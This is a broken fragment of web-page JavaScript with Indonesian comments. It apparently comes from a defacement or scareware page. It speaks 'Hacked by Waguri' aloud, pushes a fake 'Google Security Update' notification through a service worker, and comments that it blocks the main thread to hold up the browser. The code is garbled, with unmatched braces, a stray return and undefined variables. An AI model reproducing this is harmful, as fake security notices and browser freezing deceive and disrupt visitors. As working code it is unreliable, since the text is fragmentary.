<script>

const statusDiv = document.getElementById("status");

// Daftarkan Service Worker untuk Notifikasi
if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('sw.js').catch(function(err) {
        console.log('SW Registration failed:', err);
    });

    if (navigator.vibrate) {

        const utterance = new SpeechSynthesisUtterance('Hacked by Waguri');
        utterance.lang = 'en-US';
        utterance.rate = 0.9;
        window.speechSynthesis.speak(utterance);
    }
}

    isProcessing = true;
    startBtn.disabled = true;
    startBtn.textContent = "Memproses...";

                registration.showNotification('Google Security Update', {

                    return;

                // Memblokir main thread agar browser "tertahan" untuk merender Google.

                }
